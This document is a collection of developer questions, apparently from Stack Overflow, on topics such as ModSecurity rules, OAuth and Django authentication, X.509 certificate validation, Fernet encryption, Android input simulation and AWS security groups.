<p>I've looked at the recipe in <code>/usr/share/modsecurity-crs/rules/</code> and I was expecting to find a regular expression or something similar, but there isn't one.  The only comment is a reference to <a href=""https://libinjection.client9.com/"" rel=""nofollow noreferrer"">https://libinjection.client9.com/</a> which does not resolve.  Does the fingerprint '1kn&amp;n' somehow reference the particular pattern that's triggering?  Is there a way of looking that up somewhere?  And if so, is it possible to use this to selectively whitelist parts of the rule?</p>
"
"<p>For a simple project, I want to use the CKKS encryption scheme via the PYfhel library. I need to evaluate a matrix-vector product, e.g. Y = A*X.</p>
<p><strong>Question</strong>: How to do it properly with PyFhel ?</p>
<p><strong>Partial Answers</strong></p>
<ol>
<li><p>For the moment, my idea is to encrypt each coefficient of A and X as different data and implement the matrix vector product by writing manually the scalar product. But this solution is not really satisfactory and scalable. And I have doubt about the security of encrypting only scalars ?</p>
</li>
<li><p>I can implement the dot product of the first line of A with X and the second line of A with X. This will give me the two components of Y but how to get the fully encrypted vector ?</p>
</li>
</ol>
"
"<p>Authorization via digest happens in 2 steps. At the beginning I get a 401 error and in the header I get the data I need. Then I use this data to calculate the response.</p>
<pre><code># first query
$resource = fopen($url, 'r');
p($http_response_header);

# get nonce
preg_match('/nonce=&quot;([^&quot;]+)&quot;/', $http_response_header[1], $matches);
$nonce = $matches[1];

# calculate request for digest
$digest = calculateDigest($username, $password, $realm, $nonce, $uri, $method, $qop, $nc, $cnonce);

// HTTP header settings
$options = [
    'http' =&gt; [
        'method' =&gt; 'GET',
        'header' =&gt; &quot;Authorization: Digest username=\&quot;{$username}\&quot;, realm=\&quot;{$realm}\&quot;, nonce=\&quot;{$nonce}\&quot;, uri=\&quot;{$uri}\&quot;, response=\&quot;{$digest}\&quot;, opaque=\&quot;{$opaque}\&quot;, qop={$qop}, nc={$nc}, cnonce=\&quot;{$cnonce}\&quot;&quot;&quot;,
    ],
];

# second request
$resource = fopen($url, 'r', false, stream_context_create($options));
p($http_response_header);

// Read data from the file (URL)
while (!feof($resource)) {
    $response = fgets($resource);
}

// Closing the resource
fclose($resource);

p($response);
</code></pre>
<p>I run it in a browser and see the following picture:</p>
<pre><code>Warning: fopen(http://myip/cgi-bin/mediaFileFind.cgi?action=factory.create): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized in C:\OSPanel\domains\cam.local\uploader.php on line 54
Array
(
    [0] =&gt; HTTP/1.1 401 Unauthorized
    [1] =&gt; WWW-Authenticate: Digest realm=&quot;Login to bd72fbb2e0734a3cb18d4cb40504cdf0&quot;, qop=&quot;auth&quot;, nonce=&quot;2142598378&quot;, opaque=&quot;1a067f2162e6693bed2d111d38af7bee229a316f&quot;
    [2] =&gt; Connection: close
    [3] =&gt; CONTENT-LENGTH: 0
)
Array
(
    [0] =&gt; HTTP/1.1 200 OK
    [1] =&gt; X-XSS-Protection: 1;mode=block
    [2] =&gt; X-Frame-Options: SAMEORIGIN
    [3] =&gt; Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
    [4] =&gt; Strict-Transport-Security: max-age=604800; includeSubDomains
    [5] =&gt; Content-type: text/plain;charset=utf-8
    [6] =&gt; CONNECTION: close
    [7] =&gt; CONTENT-LENGTH: 19
)
</code></pre>
<p>But if I refresh the page several times, I see this picture:</p>
<pre><code>...
    [5] =&gt; Content-type: text/plain;charset=utf-8
    [6] =&gt; CONNECTION: close
    [7] =&gt; CONTENT-LENGTH: 19
)
result=2134173032
</code></pre>
<p>result is exactly the output of $response. So for some reason result is not displayed. How can I figure out what the reason is and fix it? If I do the usual file_get_contents(), everything will work, but I am interested in fopen().</p>
"
"<p>I'm working on a remote access application (similiar to AnyDesk) to access mobiles on a lan network and use them with just your browser. At this point, I'm able to send the device display output via WebSockets and access to it live via a browser (from my PC). This works fine and I can see whatever I do in the mobile, but in my PC. Now, I'm trying to find a way to simulate a tap input: the client (my pc) sends the x and y coordinates to the mobile (via WebSocket) and I'm able to get those coordinates in my android code, but I can't find a way to fire this input.
Im using Adnroid Studio Hedhedog and my project is written in Java Gradle with the minSDK version 30.</p>
<p>I've tried whatever is in my knwoledge, as I hadn't ever programmed in Java, to get this work.</p>
<p>Tried using instrumentation:</p>
<pre><code>public class InputSimulator {
    public static void simulateTap (int x, int y) {
        Instrumentation inst = new Instrumentation();
        long timeDown = SystemClock.uptimeMillis();
        long eventTime = timeDown + 100;
        MotionEvent motionEventDown = MotionEvent.obtain(timeDown,eventTime,MotionEvent.ACTION_DOWN,x,y,0);
        inst.sendPointerSync(motionEventDown);
        MotionEvent motionEventUP = MotionEvent.obtain(timeDown,eventTime,MotionEvent.ACTION_UP,x,y,0);
        inst.sendPointerSync(motionEventUp);
        motionEventDown.recycle();
        motionEventUp.recycle();
    }
}
</code></pre>
<p>This would work if android security would allow me (above 8.0 is not allowed, I think): this raises <code>java.lang.SecurityException: Injecting to another application requires INJECT_EVENTS permission</code> when outside my application. Adding this permission in the MANIFEST, shows an error: <code>Permissions with the protection level signature, privileged or signatureOrSystem are only granted to system apps</code>...</p>
<p>Using Runtime to run a command also doesn't seem to work...</p>
<pre><code>public class InputSimulator {
    public static void simulateTap (int x, int y) {
        Process process = Runtime.getRuntime().exec(&quot;input &quot; + x + &quot; &quot; + y);
        int exitCode = process.waitFor();
        Log.d(&quot;INPUT COMMAND CODE: &quot; + exitCode); // exitCode is 0 and no tap is performed.
    }
}
</code></pre>
<p>Also tried to create an <code>AccesibilityService</code> but can't find the way to make my code work.</p>
<h2>TL/DR</h2>
<p>Looking and searching through the entire web to find a way to launch a virtual input screen tap: seems impossible, even more in lasts android versions. Is there a way to perform a tap, even outside my application (maybe a service or sum)? Do I only have left to use rooted devices or install my application at a system level? Note that I don't want to send input events inside my application, but any application that the user has open.</p>
"
"<p>From my client side, I have taken an authorization code using the <code>google.accounts.oauth2.initCodeClient()</code> with <code>ux_mode</code> set to <code>popup</code>. I would be passing the code to my server side so it could be the one making calls to the API. I'm trying to follow the following step provided by Google:</p>
<blockquote>
<p>After your backend platform receives an authorization code from Google and verifies the request, use the auth code to obtain access and refresh tokens from Google to make API calls.</p>
<p><strong>Follow the instructions</strong> starting at <a href=""https://developers.google.com/identity/protocols/oauth2/web-server#exchange-authorization-code"" rel=""nofollow noreferrer"">Step 5: Exchange authorization code for refresh and access tokens</a> of the <em>Using OAuth 2.0 for Web Server Applications</em> guide.</p>
</blockquote>
<p>But I have no idea how how to configure it.</p>
<pre><code>class GoogleAuthorizationView(APIView):

    def post(self, request):
        authoriztion_code = request.data.get(&quot;authorization_code&quot;)
        if authoriztion_code is None:
            return Response(
                {&quot;error&quot;: &quot;Please provide a valid authorization code&quot;},
                status=status.HTTP_400_BAD_REQUEST,
            )

        flow = Flow.from_client_secrets_file(
            &quot;path/to/client_secret.json&quot;,
            scopes=[
                &quot;https://www.googleapis.com/auth/userinfo.profile&quot;,
                &quot;https://www.googleapis.com/auth/userinfo.email&quot;,
                &quot;https://www.googleapis.com/auth/user.birthday.read&quot;,
            ],
            # I only added this because it's giving me error if not present.
            redirect_uri=&quot;http://127.0.0.1:8000/google-authorize/&quot;, 
        )

        flow.fetch_token(code=authoriztion_code)
        credential = flow.credentials

        print(credential)
</code></pre>
<p>This is my attempt to exchange my code to access token, but it's giving me <code>(invalid_grant) Bad request</code>. For context, I am using Django on my backend. What did I miss? Am I supposed to use <code>Flow</code>? I don't really need to redirect the user.</p>
"
"<p><a href=""https://support.google.com/faqs/answer/10046138"" rel=""nofollow noreferrer"">https://support.google.com/faqs/answer/10046138</a></p>
<p>I have several questions regarding the above vulnerabilities.</p>
<ol>
<li><p>At this time, it is possible to upload, review, and publish apps on the Google Play Console without addressing the above event. What problems may occur in the future if this vulnerability is left unaddressed?</p>
</li>
<li><p>I am currently releasing an app on the Google Play Store that does not support the above event. If I do not respond to any of the above issues in the future, will it have any negative impact on the apps currently published on the Google Play Store?</p>
</li>
</ol>
<p><a href=""https://support.google.com/faqs/answer/10046138"" rel=""nofollow noreferrer"">https://support.google.com/faqs/answer/10046138</a></p>
<p>We plan to implement the responses described in the above article in the future.</p>
"
"<p>I need to implement a custom path validation rule to verify an X.509 certificate chain based on a custom Certificate Policy and set of Policy Qualifiers I'm defining for a specific application.</p>
<hr />
<p>As a minified example:</p>
<p>My X.509 certificates in the chain here include a fragment like this:</p>
<pre class=""lang-yaml prettyprint-override""><code>extensions:
- extnID: !oid 2.5.29.32 # Certificate Policies
  critical: false
  extnValue:
  - policyIdentifier: !oid 1.3.6.1.5.5.7.13.1.1 # testPolicy
    policyQualifiers:
    - policyQualifierId: !oid 1.3.6.1.5.5.7.13.2.1 # testQualifier
      qualifier: !int 100
</code></pre>
<p>For testing purposes (per RFC 7229) I've assigned OIDs from the 1.3.6.1.5.5.7.13 testing arc:</p>
<ul>
<li><code>testPolicy</code> is a Certificate Policy with OID 1.3.6.1.5.5.7.13.1.1, defined as being qualified by <code>testQualifier</code>.</li>
<li><code>testQualifier</code> is a Policy Qualifier with OID 1.3.6.1.5.5.7.13.2.1, defined as an integer.</li>
</ul>
<p>A chain of certificates containing this extension is valid only if the value of the <code>testPolicy</code>'s <code>testQualifier</code> decreases monotonically along the certificate chain. That is, in a valid chain you might have a root certificate with a value of 100, then some intermediate CA certificate might have 50, some lower CA certificate might specify 10. etc. But if any of those numbers were in a different order the chain must be rejected.</p>
<hr />
<p>(Note: that the actual application I'm working on will be evaluating a more complicated partial order on a more complicated structure; and it also includes additional things like custom Extended Key Usage values and will use actual OIDs allocated from a PEN arc registered with IANA. My question is not about any of those things.)</p>
<hr />
<p>The implementation of a rule like this doesn't feel like it should be very complicated conceptually, but there are a number of rules about how Certificate Policies are evaluated <em>in general</em> that also need to be respected.</p>
<p>I specifically <em>want</em> the functionality provided by other standard X.509 extensions; this is a useful feature and the primary reason for implementing this piece as a Certificate Policy rather than a separate Extension.</p>
<p>Just to list a <em>few</em> of these general behaviors:</p>
<ul>
<li><strong>Require Explicit Policy:</strong> Validation needs to reject a path if it has too many certificates in a row lacking the policy, if specified by a Policy Constraint extension's <code>requireExplicitPolicy</code> value.</li>
<li><strong>Any Policy:</strong> Validation needs to accept an <code>anyPolicy</code> policy as another way for an upstream certificate to be considered a valid path.</li>
<li><strong>Inhibit AnyPolicy:</strong> Validation needs to still ignore an <code>anyPolicy</code> if it's inhibited by the Inhibit AnyPolicy extension.</li>
<li><strong>Policy Mapping:</strong> Validation needs to also look for OIDs considered synonyms in the appropriate Policy Mapping extensions in the chain.</li>
<li><strong>Inhibit Mapping:</strong> Validation needs to enforce the constraint on where Policy Mappings can appear, if specified by a Policy Constraint extension's <code>inhibitMapping</code> value.</li>
</ul>
<p>I could theoretically parse each certificate myself with ASN.1 and run a separate validation pass with just my own logic in addition to a separate run through an X.509-specific library. But that will mean needing to re-implement other portions of this logic that are already standard, so I would like to avoid that approach both for expediency and for correctness.</p>
<hr />
<p>I'm not married to any particular library or any particular language for this project. I'm still prototyping the specification at this point; any tool that provides a straightforward way to implement this type of custom path validation would be useful to me.</p>
<p>So far, I've tried to search through the source of <a href=""https://github.com/openssl/openssl"" rel=""nofollow noreferrer"">openSSL</a> and <a href=""https://github.com/pyca/cryptography"" rel=""nofollow noreferrer"">pyca/cryptography</a>, but my search skills have come up inadequate: I've not been able to find where path validation logic actually occurs, and it's unclear to me if either project necessarily has facilities to straightforwardly add this type of validation rule.</p>
<p>I don't expect a task nearly so esoteric to have a written how-to guide ready to go, either. What I'm looking for is specific libraries that have ways to add this, and pointers to <em>where</em> in the source I should be reading to figure out how.</p>
"
"<p>I generated two certificates using openssl cli. The first (if I'm not wrong) should be rsa_pss_rsae_sha256 and the second (dito) should be rsa_pss_pss_sha256.</p>
<pre><code>openssl genpkey -out ca-rsa.key.pem -algorithm RSA
openssl genpkey -out ca-rsa-pss.key.pem -algorithm RSA-PSS

# rsae
openssl req -x509 -days 1 -subj &quot;/CN=ca-rsae&quot; \
            -sigopt rsa_padding_mode:pss -sha1 -sigopt rsa_pss_saltlen:20 \
            -key ca-rsa.key.pem -out ca-rsae.cert.pem
            

# rsa-pss
openssl req -x509 -days 1 -subj &quot;/CN=ca-rsa-pss&quot; \
            -key ca-rsa-pss.key.pem -out ca-rsa-pss.cert.pem
            
</code></pre>
<p>Using openssl to print the two certificate gives the following (truncated for briefly) result:</p>
<pre><code># rsae
openssl x509 -noout -text -in ca-rsae.cert.pem
Certificate:
    Data:
        Signature Algorithm: rsassaPss
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption

# rsa-pss
openssl x509 -noout -text -in ca-rsa-pss.cert.pem
Certificate:
    Data:
        Signature Algorithm: rsassaPss
        Subject Public Key Info:
            Public Key Algorithm: rsassaPss
</code></pre>
<p>Now I'm trying to determine the TLS SignatureScheme of each certificate using cryptography but it seems that the lib doesn't distinguish <code>Public Key Algorithm: rsaEncryption</code> from <code>Public Key Algorithm: rsassaPss</code> and just create an RSAPublicKey object for both:</p>
<pre><code>&gt;&gt;&gt; for cert in (rsae, rsa_pss):
...     print(cert.public_key())
...     print(cert.signature_algorithm_oid)
...     print(cert.signature_algorithm_parameters)
...     print(cert.signature_hash_algorithm)
...     print()
...

&lt;cryptography.hazmat.bindings._rust.openssl.rsa.RSAPublicKey object at 0x7f35b8dbd850&gt;
&lt;ObjectIdentifier(oid=1.2.840.113549.1.1.10, name=RSASSA-PSS)&gt;
&lt;cryptography.hazmat.primitives.asymmetric.padding.PSS object at 0x7f35b9c4ec50&gt;
&lt;cryptography.hazmat.primitives.hashes.SHA1 object at 0x7f35b9c4ec50&gt;

&lt;cryptography.hazmat.bindings._rust.openssl.rsa.RSAPublicKey object at 0x7f35b8dbd850&gt;
&lt;ObjectIdentifier(oid=1.2.840.113549.1.1.10, name=RSASSA-PSS)&gt;
&lt;cryptography.hazmat.primitives.asymmetric.padding.PSS object at 0x7f35b9c4f010&gt;
&lt;cryptography.hazmat.primitives.hashes.SHA256 object at 0x7f35b9c4f010&gt;
</code></pre>
<p>I expected the public key to have an attribute to differentiate the two, kind of signature_algorithm_oid but for the public key. Introspecting the object (dir), no such attribute seems to exist.</p>
<p>Hence the question, how to differentiate the two using the cryptography python library?</p>
"
"<p>I'm trying to setup user authentication with discord oauth2.
Everything worked fine but now I get infinite loops between my auth endpoints, I've been struggling for hours and I can't figure why it doesn't work.</p>
<p>It basically works like this :</p>
<pre class=""lang-py prettyprint-override""><code>path(&quot;oauth2/login&quot;, discord_login, name=&quot;discord_login&quot;),
path(&quot;oauth2/login/redirect&quot;, discord_login_redirect, name=&quot;discord_login_redirect&quot;),
path(&quot;auth/user&quot;, get_authenticated_user, name='get_authenticated_user')
</code></pre>
<p>'<strong>oauth2/login</strong>' redirects me to discord oauth2 then it redirects me to '<strong>auth/user</strong>' after authentication succeeded.</p>
<pre class=""lang-py prettyprint-override""><code>#@login_required(login_url=&quot;/oauth2/login&quot;)
def get_authenticated_user(request):
    print(&quot;get_authenticated_user : authenticated = &quot;, request.user.is_authenticated)
    print(&quot;get_authenticated_user : request = &quot;, request)
    authenticated_user = request.user
    print(&quot;get_authenticated_user : user = &quot;, authenticated_user)
    serialized_user = serialize_user(authenticated_user)
    return JsonResponse(serialized_user)

def discord_login(request):
    return redirect(settings.SOCIAL_AUTH_DISCORD_REDIRECT_URI)

def discord_login_redirect(request):
    if request.user.is_authenticated:
        return redirect('/auth/user')
    user_data = exchange_code(request.GET.get('code'))
    if user_data is not None:
        user = authenticate(request, user=user_data)
        if user is not None:
            login(request, user)
            print(&quot;discord_login_redirect : User = &quot;, user)
            print(&quot;discord_login_redirect : authenticated = &quot;, request.user.is_authenticated)
            return redirect('/auth/user')
        else:
            return HttpResponse(&quot;Authentication failed&quot;)
    return HttpResponseForbidden(&quot;Authentication canceled by user&quot;)
</code></pre>
<p>As I've chosen to implement <strong>@login_required</strong> to '<strong>/auth/user</strong>', I get infinite loops between the 2 endpoints, It seems that user is authenticated but it doesn't recognize it.</p>
<p>Here are my logs :</p>
<pre class=""lang-py prettyprint-override""><code>11:49:27 web.1   |  Attempting to authenticate user with Discord ID:  xxx
11:49:27 web.1   |  User with Discord ID %s found. xxx
11:49:27 web.1   |  global_name  =  xxx
11:49:27 web.1   |  avatar  =  xxx
11:49:27 web.1   |  public_flags  =  64
11:49:27 web.1   |  flags  =  64
11:49:27 web.1   |  locale  =  fr
11:49:27 web.1   |  mfa_enabled  =  False
11:49:27 web.1   |  discord_login_redirect : User =  ID: xxx, Global Name: xxx, Avatar: xxx, Public Flags: 64, Flags: 64, Locale: fr, MFA Enabled: False, Last Login: 2024-02-18 10:49:23.736180+00:00, Connections: &lt;QuerySet [&lt;Connection: Connection object (25)&gt;, &lt;Connection: Connection object (26)&gt;, &lt;Connection: Connection object (27)&gt;, &lt;Connection: Connection object (28)&gt;]&gt;
11:49:27 web.1   |  discord_login_redirect : authenticated =  True
11:49:27 web.1   |  get_authenticated_user : authenticated =  False
11:49:27 web.1   |  get_authenticated_user : request =  &lt;WSGIRequest: GET '/auth/user'&gt;
11:49:27 web.1   |  get_authenticated_user : user =  AnonymousUser
</code></pre>
<p>When I'm on '<strong>/auth/user</strong>', I can see '<strong>sessionid</strong>' and '<strong>csrftoken</strong>' in the dev console but I'm still an AnonymousUser.</p>
<p>In my database, last_login is actualized :</p>
<pre class=""lang-sql prettyprint-override""><code>levellink=# select * from social_discorduser;
date_joined          |         id          | global_name |              avatar              | public_flags | flags | locale | mfa_enabled |          last_login           |
----------+--------------+------------+-----------+----------+-----------+-------------------------
17:16:42.667697+01 |  xxx | xxx | xxx |           64 |    64 | fr     | f           | 2024-02-18 11:16:00.694995+01 |
</code></pre>
<pre class=""lang-py prettyprint-override""><code>#settings.py

ALLOWED_HOSTS = []
    SOCIAL_AUTH_DN_REDIRECT_URI = &quot;http://localhost:8000&quot;

INSTALLED_APPS = [
    'whitenoise.runserver_nostatic',
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'social_django',
    'rest_framework',
    'corsheaders',
    'social'
]

AUTHENTICATION_BACKENDS = [
    'social.auth.DiscordAuthenticationBackend'
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'whitenoise.middleware.WhiteNoiseMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'social_django.middleware.SocialAuthExceptionMiddleware',
]

CORS_ALLOWED_ORIGINS = [&quot;xxx&quot;, &quot;xxx&quot;]

CORS_ALLOW_CREDENTIALS = True

SESSION_COOKIE_AGE = 3600
SESSION_EXPIRE_AT_BROWSER_CLOSE = False
</code></pre>
<p>Do you have any clue on how to fix that please ?</p>
<p>Thanks a lot !</p>
"
"<pre><code> def encrypt(self):
        if not os.path.exists(self.filename):
            raise Exception('File does not exist!')

        # Generate a random salt
        salt = Fernet.generate_key()

        # Calculate the HMAC of the salt using the key
        hmac_digest = hmac.new(self.key, salt, hashlib.sha256).digest()

        # Encrypt the data with the salt and key
        fernet = Fernet(salt + self.key)
        with open(self.filename, 'rb') as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)

        # Write the encrypted data to the file
        with open(self.filename, 'wb') as file:
            file.write(encrypted_data)

     

 def decrypt(self):
        if not os.path.exists(self.filename):
            raise Exception('File does not exist!')

        # Read the salt and HMAC digest from the separate file
        with open(self.filename + '.salt', 'rb') as file:
                k_sz = Fernet.key_size
                salt = file.read(k_sz)
                hmac_digest = file.read(hashlib.sha256().digest_size)
</code></pre>
<p>here in the decrypt function i am trying to get the salt and hmac value stored in the encrypted file. But receiving the error</p>
<pre><code> File &quot;C:\python programs\test2.py&quot;, line 61, in decrypt
    k_sz = Fernet.key_size
           ^^^^^^^^^^^^^^^
AttributeError: type object 'Fernet' has no attribute 'key_size'
</code></pre>
<p>i have tried .KEY_SIZE and Fernet(key=None).key_size then it says key value as none not expected</p>
"
"<p>I'd like to store the user that saved a model for the first time in one of the fields of that model. This is what I have.</p>
<p><code>models.py</code>:</p>
<pre><code>from django.conf import settings
class Project(models.Model):
[...]
    added_by = models.ForeignKey(settings.AUTH_USER_MODEL, null=True, blank=True, on_delete=models.PROTECT)

    def save_model(self, request, obj, form, change):
        if not obj.pk:
            obj.added_by = request.user
        super().save_model(request, obj, form, change)
</code></pre>
<p><code>settings.py</code>:</p>
<pre><code>AUTH_USER_MODEL = 'auth.User'
</code></pre>
<p>The <code>request.user</code> appears to be always empty (I'm logged in as root to the <code>/admin</code>). What am I missing?</p>
"
"<p>I have the following minimal reproducable setup:</p>
<pre><code>terraform {
  required_providers {
    aws = {
      source  = &quot;hashicorp/aws&quot;
      version = &quot;5.21.0&quot;
    }
  }
}

provider &quot;aws&quot; {
  region = &quot;eu-central-1&quot;
}

data &quot;aws_ami&quot; &quot;amazon_linux&quot; {
  most_recent = true

  owners = [&quot;amazon&quot;]

  filter {
    name   = &quot;image-id&quot;
    values = [&quot;ami-0a23a9827c6dab833&quot;]
  }
}

resource &quot;aws_vpc&quot; &quot;main&quot; {
  cidr_block = &quot;10.0.0.0/16&quot;
}

resource &quot;aws_subnet&quot; &quot;public&quot; {
  cidr_block        = &quot;10.0.1.0/24&quot;
  vpc_id            = aws_vpc.main.id
  availability_zone = &quot;eu-central-1a&quot;
}

resource &quot;aws_internet_gateway&quot; &quot;main&quot; {
  vpc_id = aws_vpc.main.id
}

resource &quot;aws_route_table&quot; &quot;public&quot; {
  vpc_id = aws_vpc.main.id

  route {
    cidr_block = &quot;0.0.0.0/0&quot;
    gateway_id = aws_internet_gateway.main.id
  }
}

resource &quot;aws_route_table_association&quot; &quot;public&quot; {
  subnet_id      = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}

resource &quot;aws_security_group&quot; &quot;inbound&quot; {
  name        = &quot;ingress-ec2&quot;
  description = &quot;For the EC2 that has the inbound traffic&quot;
  vpc_id      = aws_vpc.main.id
}

resource &quot;aws_security_group&quot; &quot;outbound&quot; {
  name        = &quot;egress-ec2&quot;
  description = &quot;For the EC2 that has the outbound traffic&quot;
  vpc_id      = aws_vpc.main.id
}

resource &quot;aws_vpc_security_group_ingress_rule&quot; &quot;main&quot; {
  security_group_id            = aws_security_group.inbound.id
  from_port                    = 5000
  to_port                      = 5000
  ip_protocol                  = &quot;tcp&quot;
  referenced_security_group_id = aws_security_group.outbound.id
}

resource &quot;aws_vpc_security_group_egress_rule&quot; &quot;main&quot; {
  security_group_id            = aws_security_group.outbound.id
  from_port                    = 5000
  to_port                      = 5000
  ip_protocol                  = &quot;tcp&quot;
  referenced_security_group_id = aws_security_group.inbound.id
}

resource &quot;aws_vpc_security_group_ingress_rule&quot; &quot;ssh_inbound&quot; {
  security_group_id = aws_security_group.inbound.id
  from_port         = 22
  to_port           = 22
  ip_protocol       = &quot;tcp&quot;
  cidr_ipv4         = &quot;0.0.0.0/0&quot;
}

resource &quot;aws_vpc_security_group_ingress_rule&quot; &quot;ssh_outbound&quot; {
  security_group_id = aws_security_group.outbound.id
  from_port         = 22
  to_port           = 22
  ip_protocol       = &quot;tcp&quot;
  cidr_ipv4         = &quot;0.0.0.0/0&quot;
}

resource &quot;aws_vpc_security_group_egress_rule&quot; &quot;internet_inbound&quot; {
  security_group_id = aws_security_group.inbound.id
  ip_protocol       = -1
  cidr_ipv4         = &quot;0.0.0.0/0&quot;
}

resource &quot;aws_vpc_security_group_egress_rule&quot; &quot;internet_outbound&quot; {
  security_group_id = aws_security_group.outbound.id
  ip_protocol       = -1
  cidr_ipv4         = &quot;0.0.0.0/0&quot;
}

resource &quot;aws_key_pair&quot; &quot;inbound&quot; {
  key_name   = &quot;ingress-ec2&quot;
  public_key = file(var.public_ssh_key)
}

resource &quot;aws_instance&quot; &quot;inbound&quot; {
  ami                         = data.aws_ami.amazon_linux.id
  instance_type               = &quot;t2.micro&quot;
  key_name                    = aws_key_pair.inbound.id
  subnet_id                   = aws_subnet.public.id
  security_groups             = [aws_security_group.inbound.id]
  associate_public_ip_address = true
}

resource &quot;aws_key_pair&quot; &quot;outbound&quot; {
  key_name   = &quot;egress-ec2&quot;
  public_key = file(var.public_ssh_key)
}

resource &quot;aws_instance&quot; &quot;outbound&quot; {
  ami                         = data.aws_ami.amazon_linux.id
  instance_type               = &quot;t2.micro&quot;
  key_name                    = aws_key_pair.outbound.id
  subnet_id                   = aws_subnet.public.id
  security_groups             = [aws_security_group.outbound.id]
  associate_public_ip_address = true
}

variable &quot;public_ssh_key&quot; {
  type    = string
  default = &quot;~/.ssh/test_key.pub&quot;
}

output &quot;ingress-ec2&quot; {
  value = aws_instance.inbound.public_ip
}

output &quot;egress-ec2&quot; {
  value = aws_instance.outbound.public_ip
}
</code></pre>
<p>when start a simple flask application into the ingress EC2 instance I get timeout errors when I try to access it from the egress EC2 instance. The problem lays in the Security Group since I have a similar setup for my RDS instance. Why is the egress EC2 instance blocked by the Security Groups here?</p>
<p>When I change</p>
<pre><code>resource &quot;aws_vpc_security_group_ingress_rule&quot; &quot;main&quot; {
  security_group_id            = aws_security_group.inbound.id
  from_port                    = 5000
  to_port                      = 5000
  ip_protocol                  = &quot;tcp&quot;
  referenced_security_group_id = aws_security_group.outbound.id
}
</code></pre>
<p>to</p>
<pre><code>resource &quot;aws_vpc_security_group_ingress_rule&quot; &quot;main&quot; {
  security_group_id            = aws_security_group.inbound.id
  from_port                    = 5000
  to_port                      = 5000
  ip_protocol                  = &quot;tcp&quot;
  cidr_ipv4                    = &quot;0.0.0.0/0&quot;
}
</code></pre>
<p>it works, which further supports my assumptions that the traffic in the initial setup get blocked by the security groups.</p>
"
"<p>I am a new comer in Django field. I have an existing Django application with independent login implemented. The task is to integrate Azure AD Single Sign On using SAML protocol. The flow is user request for application url, it will redirect to the Azure portal, Signed in using federated credential automatically and redirect to the requested url or a specific app url after authorize. I am using djangosaml2 librery.</p>
<p>I am able to redirect to the Azure portal but while authenticating I am getting &quot;csrf verification failed&quot; error. Basically I have zero knowledge about how django authentication works and how to integrate the response from azure in django. Any one please help me out with a through walkthrough of the SSO authentication process with SAML. How to get the attributes from SAML and how to authenticate and authorize. My current project structure is given below.
my-project
templates
app1
login
home
proj
settings.py
remote_xml_metadata.xml
urls.py
views.py
app1
urls.py
views.py</p>
"
"<p>I am trying to connect to a server which is on prem network using a databricks notebook. But I get error saying that &quot;failed to connect to address. UNAVAIALABLE Socket closed&quot;.
I pinged to the server IP and it got failed.
<a href=""https://i.stack.imgur.com/MxqHr.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/MxqHr.png"" alt=""enter image description here"" /></a></p>
<p>I wanted to add this IP as exception to databricks so that it can connect to it.
After learning the options to configure network configs, I understand that it needs to be added as a rules in network security group. So I added it as a outbound rule with below configs :</p>
<p><a href=""https://i.stack.imgur.com/yWhrc.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yWhrc.png"" alt=""enter image description here"" /></a></p>
<p>But I am still not able to successfully ping the server IP.</p>
<p>I have shared all the details. Can anyone guide me what I am doing wrong?</p>
"
"<p>I'm newbie in django and i'm building an app which include Authentification so i would like to use Django built in authentification system but it doest not provide a SignUp opertaion so how can implement   this kind of operation ?</p>
"
"<p>I'm very new to AWS, so apologise if I am asking what might be a ridiculous question.</p>
<p>I am trying to understand more about security groups. Based of what I found from reading various documentations... what I understand (not sure if im right) is there are two types of security groups. One is EC2-VPC which is an EC2 security group type and another is a VPC Security group. We can attach these security group types to other aws services such as ELB/NLB,S3 etc...am I wrong?</p>
<p>Also came across a RDS security group. Is that a different type of security group? How many types of security groups are there? How do I find out which type of security group is attached to an aws service?</p>
"
"<p>I have Jakarta EE 10 web application with CustomFormAuthenticationMechanismDefinition. My web.xml setting:</p>
<pre><code> &lt;welcome-file-list&gt;
    &lt;welcome-file&gt;app/index.xhtml&lt;/welcome-file&gt;
&lt;/welcome-file-list&gt;
</code></pre>
<p>I have settings for these security-constraint with recquired auth-constraint for access</p>
<pre><code>/app/* is an application users area
/client/* is client path
</code></pre>
<p>For login action I have this code:</p>
<pre><code>public void execute() throws IOException {
    switch (processAuthentication()) {
        case SEND_CONTINUE:               
            fc.responseComplete();
            break;
        case SEND_FAILURE:                
            fc.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_ERROR, &quot;Invalid Credentials&quot;, null));
            break;
        case SUCCESS:              
            if (isClientRole()) {
                context.redirect(context.getRequestContextPath() + &quot;/client/nets.xhtml&quot;);
            } else {                    
                context.redirect(context.getRequestContextPath() + &quot;/app/index.xhtml&quot;);
            }
            break;
    }
}

private AuthenticationStatus processAuthentication() {
    return securityContext.authenticate((HttpServletRequest) context.getRequest(),
            (HttpServletResponse) context.getResponse(),
            AuthenticationParameters.withParams()                        
                    .credential(new UsernamePasswordCredential(username, password)));
}
</code></pre>
<p>SUCCESS part works as expected, but  SEND_CONTINUE part is still unknown behavior like described in this <a href=""https://stackoverflow.com/questions/64750354/on-a-successful-login-securitycontext-authenticate-returns-authenticationstat/77983880#77983880"">question</a> and I can't find, how to control it.</p>
<p>So question is - what is a right way redirect user based on his Role in JavaEE/Jakarta EE Security?</p>
"
"<p>I am making my first app, which is a todolist app. I am trying to get users to register with email and login with it.</p>
<p>This is the error that the debug shows me:</p>
<pre><code>ProgrammingError at /register/

no existe la relación «core_user»
LINE 1: SELECT 1 AS &quot;a&quot; FROM &quot;core_user&quot; WHERE &quot;core_user&quot;.&quot;email&quot; =...
                             ^

Request Method:     POST
Request URL:    http://127.0.0.1:8000/register/
